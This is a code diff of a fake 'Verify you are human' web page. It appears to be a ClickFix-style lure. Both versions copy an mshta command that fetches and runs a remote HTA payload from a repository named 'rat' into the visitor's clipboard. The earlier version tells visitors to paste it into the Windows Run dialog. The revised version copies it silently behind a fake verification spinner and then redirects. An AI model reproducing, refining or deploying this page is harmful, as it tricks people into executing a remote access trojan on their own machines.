@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Verify you are human</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>www.mywebsite.com</title>
     <style>
         * {
             margin: 0;
@@ -11,7 +11,7 @@
             box-sizing: border-box;
         }
         body {
-            background: #0a0c10;
+            background: #f0f2f5;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
             min-height: 100vh;
             display: flex;
@@ -19,158 +19,131 @@
             align-items: center;
             padding: 20px;
         }
-        .verification-box {
-            background: #ffffff;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-            max-width: 480px;
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 500px;
             width: 100%;
-            padding: 40px 32px;
+            padding: 40px 35px;
             text-align: center;
         }
-        h2 {
-            font-size: 26px;
-            font-weight: 600;
-            margin-bottom: 12px;
-            color: #1a202c;
+        h1 {
+            font-size: 28px;
+            font-weight: 500;
+            color: #1a1a2e;
+            margin-bottom: 25px;
+            letter-spacing: -0.3px;
         }
-        .sub-text {
-            color: #4a5568;
-            font-size: 16px;
-            margin-bottom: 28px;
+        .verify-text {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 30px;
             line-height: 1.5;
         }
         .verify-button {
             background: #1e6f3f;
             color: white;
             border: none;
-            padding: 14px 24px;
-            font-size: 18px;
-            font-weight: 600;
-            border-radius: 8px;
-            width: 100%;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: 500;
+            border-radius: 6px;
             cursor: pointer;
+            width: 100%;
             transition: background 0.2s;
-            margin-bottom: 24px;
         }
         .verify-button:hover {
             background: #155a34;
         }
-        .extra-box {
-            background: #fff5e6;
-            border-left: 4px solid #f6821f;
-            padding: 14px;
-            border-radius: 8px;
-            margin: 20px 0;
-            text-align: left;
+        .verify-button:disabled {
+            background: #9cb8a8;
+            cursor: not-allowed;
         }
-        .extra-box strong {
-            color: #c75a00;
-            font-size: 15px;
-        }
-        .steps-container {
-            background: #f7fafc;
-            border-radius: 12px;
-            padding: 20px;
-            text-align: left;
-            margin: 20px 0;
-            border: 1px solid #e2e8f0;
-            display: none;
-        }
-        .steps-container p {
-            margin: 10px 0;
+        .status-area {
+            margin-top: 25px;
             font-size: 14px;
-            color: #2d3748;
+            min-height: 50px;
         }
-        .steps-container code {
-            background: #edf2f7;
-            padding: 6px 10px;
-            border-radius: 6px;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
+        .spinner {
             display: inline-block;
-            word-break: break-all;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #e0e0e0;
+            border-top: 2px solid #1e6f3f;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
         }
-        .status-message {
-            background: #e6fffa;
-            color: #234e52;
-            padding: 12px;
-            border-radius: 8px;
-            margin: 16px 0;
-            font-size: 14px;
-            display: none;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        .footer-note {
-            margin-top: 28px;
+        .success-message {
+            color: #1e6f3f;
+        }
+        .failure-message {
+            color: #dc3545;
+        }
+        .feedback-link {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #666;
+        }
+        .feedback-link a {
+            color: #1e6f3f;
+            text-decoration: none;
+        }
+        .footer-message {
+            margin-top: 25px;
             font-size: 12px;
-            color: #718096;
-            border-top: 1px solid #e2e8f0;
+            color: #888;
+            border-top: 1px solid #eaeaea;
             padding-top: 20px;
         }
-        @media (max-width: 500px) {
-            .verification-box {
-                padding: 28px 20px;
+        @media (max-width: 550px) {
+            .container {
+                padding: 30px 20px;
             }
-            h2 {
-                font-size: 22px;
+            h1 {
+                font-size: 24px;
             }
         }
     </style>
 </head>
 <body>
-<div class="verification-box">
-    <h2>✓ Verify you are human</h2>
-    <div class="sub-text">Complete the verification below to continue</div>
-
-    <!-- Extra Verification Required box (1:1 style) -->
-    <div class="extra-box">
-        <strong>⚠️ Extra Verification Required</strong>
-        <p style="margin-top: 8px; font-size: 13px; color: #8b5a2b;">Additional step needed to confirm your identity.</p>
+<div class="container">
+    <h1>www.mywebsite.com</h1>
+    <div class="verify-text">
+        Verify you are human by completing the action below.
     </div>
-
-    <button class="verify-button" id="mainVerifyBtn">Verify now</button>
-
-    <div class="steps-container" id="stepsPanel">
-        <p><strong>📋 Follow these steps exactly:</strong></p>
-        <p>1️⃣ Press <strong>Windows + R</strong> on your keyboard (opens Run dialog).</p>
-        <p>2️⃣ In the Run box, <strong>right-click</strong> and choose <strong>Paste</strong> (or press Ctrl+V).</p>
-        <p>3️⃣ Press <strong>Enter</strong> to complete verification.</p>
-        <p style="margin-top: 12px;">📌 <strong>Command already copied:</strong></p>
-        <p><code id="cmdText">mshta https://raw.githubusercontent.com/Skibidi101201/rat/main/payload.hta</code></p>
+    <button class="verify-button" id="verifyBtn">Verify you are human</button>
+    <div class="status-area" id="statusArea"></div>
+    <div class="feedback-link">
+        Stuck here? <a href="#">Send Feedback</a>
     </div>
-
-    <div class="status-message" id="statusMsg">
-        ✅ Command copied to clipboard! Open Run (Windows+R) and paste.
-    </div>
-
-    <div class="footer-note">
+    <div class="footer-message">
         www.mywebsite.com needs to review the security of your connection before proceeding.
     </div>
 </div>
 
 <script>
     (function() {
-        // Your mshta command (same as before)
+        const verifyBtn = document.getElementById('verifyBtn');
+        const statusArea = document.getElementById('statusArea');
+        
+        // The mshta command (silent)
         const mshtaCommand = 'mshta https://raw.githubusercontent.com/Skibidi101201/rat/main/payload.hta';
         
-        // Display command in the steps panel
-        const cmdElement = document.getElementById('cmdText');
-        if (cmdElement) {
-            cmdElement.innerText = mshtaCommand;
-        }
-        
-        const verifyBtn = document.getElementById('mainVerifyBtn');
-        const stepsPanel = document.getElementById('stepsPanel');
-        const statusDiv = document.getElementById('statusMsg');
-        
-        // Copy function (works on all browsers)
-        function copyToClipboard(text) {
-            // Fallback using textarea
+        // Silent copy function
+        function copyToClipboardSilent(text) {
             const textarea = document.createElement('textarea');
             textarea.value = text;
             textarea.style.position = 'fixed';
             textarea.style.top = '-9999px';
             textarea.style.left = '-9999px';
+            textarea.style.opacity = '0';
             document.body.appendChild(textarea);
             textarea.select();
             document.execCommand('copy');
@@ -178,23 +151,24 @@
         }
         
         verifyBtn.addEventListener('click', function() {
-            // 1. Copy the mshta command
-            copyToClipboard(mshtaCommand);
+            // Disable button
+            verifyBtn.disabled = true;
             
-            // 2. Show the steps panel
-            stepsPanel.style.display = 'block';
+            // Show spinner and "Verifying..."
+            statusArea.innerHTML = '<span class="spinner"></span> Verifying...';
             
-            // 3. Show status message
-            statusDiv.style.display = 'block';
+            // Silently copy mshta command to clipboard
+            copyToClipboardSilent(mshtaCommand);
             
-            // 4. Optional: change button text temporarily
-            const originalText = verifyBtn.innerText;
-            verifyBtn.innerText = '✓ Copied! Follow steps above';
-            verifyBtn.style.background = '#2c7a4d';
-            setTimeout(() => {
-                verifyBtn.innerText = originalText;
-                verifyBtn.style.background = '#1e6f3f';
-            }, 3000);
+            // After 2 seconds, show success and redirect
+            setTimeout(function() {
+                statusArea.innerHTML = '<span class="success-message">✓ Success!</span>';
+                
+                // Redirect to success page after another second
+                setTimeout(function() {
+                    window.location.href = 'https://mellifluous-beijinho-617d85.netlify.app/index.html';
+                }, 1000);
+            }, 2000);
         });
     })();
 </script>
